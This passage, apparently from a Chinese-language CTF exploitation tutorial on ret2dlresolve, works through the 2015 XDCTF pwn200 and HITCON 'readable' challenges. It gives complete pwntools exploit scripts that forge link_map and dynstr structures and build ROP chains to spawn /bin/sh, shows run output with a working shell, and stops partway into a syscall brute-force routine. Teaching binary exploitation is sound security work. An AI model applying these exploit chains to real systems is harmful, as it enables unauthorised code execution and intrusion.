.got:0000000000600FF0 _got            segment para public 'DATA' use64
.got:0000000000600FF0                 assume cs:_got
.got:0000000000600FF0                 ;org 600FF0h
.got:0000000000600FF0 __libc_start_main_ptr dq offset __libc_start_main
.got:0000000000600FF0                                         ; DATA XREF: _start+24↑r
.got:0000000000600FF8 __gmon_start___ptr dq offset __gmon_start__
.got:0000000000600FF8                                         ; DATA XREF: _init_proc+4↑r
.got:0000000000600FF8 _got            ends
.got:0000000000600FF8
.got.plt:0000000000601000 ; ===========================================================================
.got.plt:0000000000601000
.got.plt:0000000000601000 ; Segment type: Pure data
.got.plt:0000000000601000 ; Segment permissions: Read/Write
.got.plt:0000000000601000 ; Segment alignment 'qword' can not be represented in assembly
.got.plt:0000000000601000 _got_plt        segment para public 'DATA' use64
.got.plt:0000000000601000                 assume cs:_got_plt
.got.plt:0000000000601000                 ;org 601000h
.got.plt:0000000000601000 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
.got.plt:0000000000601008 qword_601008    dq 0                    ; DATA XREF: sub_400500↑r
.got.plt:0000000000601010 qword_601010    dq 0                    ; DATA XREF: sub_400500+6↑r
.got.plt:0000000000601018 off_601018      dq offset write         ; DATA XREF: _write↑r
.got.plt:0000000000601020 off_601020      dq offset strlen        ; DATA XREF: _strlen↑r
.got.plt:0000000000601028 off_601028      dq offset setbuf        ; DATA XREF: _setbuf↑r
.got.plt:0000000000601030 off_601030      dq offset read          ; DATA XREF: _read↑r
.got.plt:0000000000601030 _got_plt        ends
.got.plt:0000000000601030</code></pre><p>与此同时，通过阅读 <code>_dl_fixup</code> 函数的代码，在设置  <code>__builtin_expect(ELFW(ST_VISIBILITY)(sym-&gt;st_other), 0)</code> 为 0 后，我们可以发现，该函数主要依赖了 link_map 中 l_info 的内容。因此，我们同样需要伪造该部分所需要的内容。</p>
<p>利用代码如下</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true"># context.log_level="debug"</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">]</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>
io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_64"</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_64"</span><span class="token punctuation">)</span>

bss_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
csu_front_addr <span class="token operator">=</span> <span class="token number">0x400780</span>
csu_end_addr <span class="token operator">=</span> <span class="token number">0x40079A</span>
vuln_addr <span class="token operator">=</span> <span class="token number">0x400637</span>


<span class="token keyword">def</span> <span class="token function">csu</span><span class="token punctuation">(</span>rbx<span class="token punctuation">,</span> rbp<span class="token punctuation">,</span> r12<span class="token punctuation">,</span> r13<span class="token punctuation">,</span> r14<span class="token punctuation">,</span> r15<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true"># pop rbx, rbp, r12, r13, r14, r15</span>
    <span class="token comment" spellcheck="true"># rbx = 0</span>
    <span class="token comment" spellcheck="true"># rbp = 1, enable not to jump</span>
    <span class="token comment" spellcheck="true"># r12 should be the function that you want to call</span>
    <span class="token comment" spellcheck="true"># rdi = edi = r13d</span>
    <span class="token comment" spellcheck="true"># rsi = r14</span>
    <span class="token comment" spellcheck="true"># rdx = r15</span>
    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>csu_end_addr<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rbx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rbp<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r12<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r13<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r14<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r15<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>csu_front_addr<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> <span class="token string">'\x00'</span> <span class="token operator">*</span> <span class="token number">0x38</span>
    <span class="token keyword">return</span> payload


<span class="token keyword">def</span> <span class="token function">ret2dlresolve_with_fakelinkmap_x64</span><span class="token punctuation">(</span>elf<span class="token punctuation">,</span> fake_linkmap_addr<span class="token punctuation">,</span> known_function_ptr<span class="token punctuation">,</span> offset_of_two_addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">'''
    elf: is the ELF object

    fake_linkmap_addr: the address of the fake linkmap

    known_function_ptr: a already known pointer of the function, e.g., elf.got['__libc_start_main']

    offset_of_two_addr: target_function_addr - *(known_function_ptr), where
                        target_function_addr is the function you want to execute

    WARNING: assert *(known_function_ptr-8) &amp; 0x0000030000000000 != 0 as ELF64_ST_VISIBILITY(o) = o &amp; 0x3

    WARNING: be careful that fake_linkmap is 0x100 bytes length   

    we will do _dl_runtime_resolve(linkmap,reloc_arg) where reloc_arg=0

    linkmap:
        0x00: l_addr = offset_of_two_addr
      fake_DT_JMPREL entry, addr = fake_linkmap_addr + 0x8
        0x08: 17, tag of the JMPREL
        0x10: fake_linkmap_addr + 0x18, pointer of the fake JMPREL
      fake_JMPREL, addr = fake_linkmap_addr + 0x18
        0x18: p_r_offset, offset pointer to the resloved addr
        0x20: r_info
        0x28: append
      resolved addr
        0x30: r_offset
      fake_DT_SYMTAB, addr = fake_linkmap_addr + 0x38
        0x38: 6, tag of the DT_SYMTAB
        0x40: known_function_ptr-8, p_fake_symbol_table
      command that you want to execute for system
        0x48: /bin/sh
      P_DT_STRTAB, pointer for DT_STRTAB
        0x68: fake a pointer, e.g., fake_linkmap_addr
      p_DT_SYMTAB, pointer for fake_DT_SYMTAB
        0x70: fake_linkmap_addr + 0x38
      p_DT_JMPREL, pointer for fake_DT_JMPREL
        0xf8: fake_linkmap_addr + 0x8
    '''</span>
    plt0 <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr

    linkmap <span class="token operator">=</span> p64<span class="token punctuation">(</span>offset_of_two_addr <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">64</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_linkmap_addr <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># here we set p_r_offset = fake_linkmap_addr + 0x30 - two_offset</span>
    <span class="token comment" spellcheck="true"># as void *const rel_addr = (void *)(l->l_addr + reloc->r_offset) and l->l_addr = offset_of_two_addr</span>
    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token punctuation">(</span>fake_linkmap_addr <span class="token operator">+</span> <span class="token number">0x30</span> <span class="token operator">-</span> offset_of_two_addr<span class="token punctuation">)</span>
                   <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">64</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>known_function_ptr<span class="token number">-8</span><span class="token punctuation">)</span>
    linkmap <span class="token operator">+=</span> <span class="token string">'/bin/sh\x00'</span>           <span class="token comment" spellcheck="true"># cmd offset 0x48</span>
    linkmap <span class="token operator">=</span> linkmap<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>
    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_linkmap_addr<span class="token punctuation">)</span>
    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_linkmap_addr <span class="token operator">+</span> <span class="token number">0x38</span><span class="token punctuation">)</span>
    linkmap <span class="token operator">=</span> linkmap<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>
    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_linkmap_addr <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>

    resolve_call <span class="token operator">=</span> p64<span class="token punctuation">(</span>plt0<span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_linkmap_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>linkmap<span class="token punctuation">,</span> resolve_call<span class="token punctuation">)</span>


io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Welcome to XDCTF2015~!\n'</span><span class="token punctuation">)</span>
gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>

fake_linkmap_addr <span class="token operator">=</span> bss_addr<span class="token operator">+</span><span class="token number">0x100</span>

<span class="token comment" spellcheck="true"># construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_64"</span><span class="token punctuation">)</span>
offset <span class="token operator">=</span> <span class="token number">112</span><span class="token operator">+</span><span class="token number">8</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>offset<span class="token operator">*</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span>
link_map<span class="token punctuation">,</span> resolve_call <span class="token operator">=</span> ret2dlresolve_with_fakelinkmap_x64<span class="token punctuation">(</span>elf<span class="token punctuation">,</span>fake_linkmap_addr<span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> fake_linkmap_addr<span class="token punctuation">,</span> len<span class="token punctuation">(</span>link_map<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>vuln_addr<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">assert</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">256</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># send linkmap</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>link_map<span class="token punctuation">)</span>

rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_64"</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>offset<span class="token operator">*</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#0x00000000004007a1: pop rsi; pop r15; ret; </span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0x00000000004007a1</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># stack align 16 bytes</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0x00000000004007a3</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0x00000000004007a3: pop rdi; ret;</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>fake_linkmap_addr <span class="token operator">+</span> <span class="token number">0x48</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>resolve_call<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>最终执行结果</p>
<pre class="line-numbers language-shell"><code class="language-shell">❯ python exp-fake-linkmap.py
[+] Starting local process './main_partial_relro_64': pid 51197
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] running in new terminal: /usr/bin/gdb -q  "./main_partial_relro_64" 51197
[-] Waiting for debugger: debugger exited! (maybe check /proc/sys/kernel/yama/ptrace_scope)
[*] Loaded 14 cached gadgets for './main_partial_relro_64'
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Switching to interactive mode
$ whoami
iromise<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>虽然在这样的攻击中，我们不再需要信息泄露，但是我们需要知道目标机器的 libc，更具体的，我们需要知道目标函数和某个已经解析后的函数之间的偏移。</p>
<h4 id="基于工具伪造-1"><a href="#基于工具伪造-1" class="headerlink" title="基于工具伪造"></a>基于工具伪造</h4><p>感兴趣的读者可以自行尝试使用相关的工具看是否可以攻击成功。</p>
<h3 id="Full-RELRO-1"><a href="#Full-RELRO-1" class="headerlink" title="Full RELRO"></a>Full RELRO</h3><h2 id="2015-hitcon-readable"><a href="#2015-hitcon-readable" class="headerlink" title="2015-hitcon-readable"></a>2015-hitcon-readable</h2><p>检查一下文件权限，可以发现，该可执行文件只开启了 NX 保护</p>
<pre class="line-numbers language-bash"><code class="language-bash">❯ checksec readable
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-hitcon-quals-readable/readable'</span>
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>也就是说我们其实可以直接修改 dynamic 节的内容。但是，与 2015-xdctf-pwn200 不同，这里栈溢出只能越界读取 16 个字节，而上述例子中所使用的的 ret2csu 则需要大量的字节。因此，直接使用该方法是不行了。</p>
<p>我们来仔细分析下目前的情况，即我们可以越界控制 rbp、返回地址。考虑到 read 是使用 rbp 来索引 buffer 的</p>
<pre><code>.text:0000000000400505                 lea     rax, [rbp-10h]
.text:0000000000400509                 mov     edx, 20h ; ' '  ; nbytes
.text:000000000040050E                 mov     rsi, rax        ; buf
.text:0000000000400511                 mov     edi, 0          ; fd
.text:0000000000400516                 mov     eax, 0
.text:000000000040051B                 call    _read
.text:0000000000400520                 leave
.text:0000000000400521                 retn</code></pre><p>那如果我们控制 rbp 为写的地址加上 0x10，即 targetaddr+0x10，然后再跳转到 0x400505，即栈的结构为</p>
<pre><code>return_addr -&gt; 0x400505
rbp         -&gt; target addr + 0x10
fake buf</code></pre><p>那么我们就可以控制程序在目标地址处写 16 个字节。通过不断地这样操作，我们就可以不断地读取 16 个字节，从而达到读取任意长字节的目的。</p>
<h3 id="方法1：modify-dynamic-section"><a href="#方法1：modify-dynamic-section" class="headerlink" title="方法1：modify dynamic section"></a>方法1：modify dynamic section</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true"># context.log_level="debug"</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">]</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span>
io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./readable"</span><span class="token punctuation">)</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./readable"</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./readable"</span><span class="token punctuation">)</span>

bss_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
csu_first_addr <span class="token operator">=</span> <span class="token number">0x40058A</span>
csu_second_addr <span class="token operator">=</span> <span class="token number">0x400570</span>

<span class="token keyword">def</span> <span class="token function">csu_gadget</span><span class="token punctuation">(</span>rbx<span class="token punctuation">,</span> rbp<span class="token punctuation">,</span> func_ptr<span class="token punctuation">,</span> edi<span class="token punctuation">,</span> rsi<span class="token punctuation">,</span> rdx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true"># rdx = r13</span>
    <span class="token comment" spellcheck="true"># rsi = r14</span>
    <span class="token comment" spellcheck="true"># rdi = r15d</span>
    <span class="token comment" spellcheck="true"># call [r12+rbx*8]</span>
    <span class="token comment" spellcheck="true"># set rbx+1=rbp</span>
    <span class="token keyword">return</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>csu_first_addr<span class="token punctuation">,</span> rbx<span class="token punctuation">,</span> rbp<span class="token punctuation">,</span> func_ptr<span class="token punctuation">,</span> rdx<span class="token punctuation">,</span>
                    rsi<span class="token punctuation">,</span> edi<span class="token punctuation">,</span> csu_second_addr<span class="token punctuation">]</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x38</span>

<span class="token keyword">def</span> <span class="token function">read16bytes</span><span class="token punctuation">(</span>targetaddr<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">16</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>targetaddr<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400505</span><span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> content<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token string">"\x00"</span><span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x600890</span><span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400505</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> payload

<span class="token comment" spellcheck="true"># stack privot to bss segment, set rsp = new_stack</span>
fake_data_addr <span class="token operator">=</span> bss_addr
new_stack <span class="token operator">=</span> bss_addr<span class="token operator">+</span><span class="token number">0x500</span>

<span class="token comment" spellcheck="true"># modify .dynstr pointer in .dynamic section to a specific location</span>
rop <span class="token operator">=</span> csu_gadget<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x600778</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># construct a fake dynstr section</span>
dynstr <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynstr'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>data<span class="token punctuation">(</span><span class="token punctuation">)</span>
dynstr <span class="token operator">=</span> dynstr<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"read"</span><span class="token punctuation">,</span><span class="token string">"system"</span><span class="token punctuation">)</span>
rop <span class="token operator">+=</span> csu_gadget<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>fake_data_addr<span class="token punctuation">,</span>len<span class="token punctuation">(</span>dynstr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># read /bin/sh\x00</span>
binsh_addr <span class="token operator">=</span> fake_data_addr<span class="token operator">+</span>len<span class="token punctuation">(</span>dynstr<span class="token punctuation">)</span>
rop <span class="token operator">+=</span> csu_gadget<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>binsh_addr<span class="token punctuation">,</span>len<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># 0x0000000000400593: pop rdi; ret; </span>
rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x0000000000400593</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># 0x0000000000400590: pop r14; pop r15; ret; </span>
rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x0000000000400590</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">16</span> <span class="token comment" spellcheck="true"># stack align</span>
<span class="token comment" spellcheck="true"># return to the second instruction of read'plt</span>
rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x4003E6</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># gdb.attach(io)</span>
<span class="token comment" spellcheck="true"># pause()</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    tmp <span class="token operator">=</span> read16bytes<span class="token punctuation">(</span>new_stack<span class="token operator">+</span>i<span class="token punctuation">,</span>rop<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>


<span class="token comment" spellcheck="true"># jump to the rop</span>
payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">16</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>new_stack<span class="token number">-8</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400520</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># leave ret</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># send fake dynstr addr</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>fake_data_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># send fake dynstr section</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>dynstr<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># send "/bin/sh\x00"</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="方法-2-标准-ROP"><a href="#方法-2-标准-ROP" class="headerlink" title="方法 2 - 标准 ROP"></a>方法 2 - 标准 ROP</h3><p>这个方法比较取巧，考虑到 read 函数很短，而且最后会调用系统调用，因此在 libc 的实现中会使用 syscall 指令，而同时我们可以修改 read 的 got 表，那如果我们把 <a href="mailto:read@got.plt">read@got.plt</a> 修改为 syscall 的地址，同时布置好相关的参数，即可执行系统调用。这里我们控制 ROP 执行<code>execve("/bin/sh",NULL,NULL)</code>。</p>
<p>首先，我们需要爆破来寻找 syscall 具体的地址，我们可以考虑调用 write 函数来看是否真正执行了 syscall指令</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">bruteforce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    rop_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
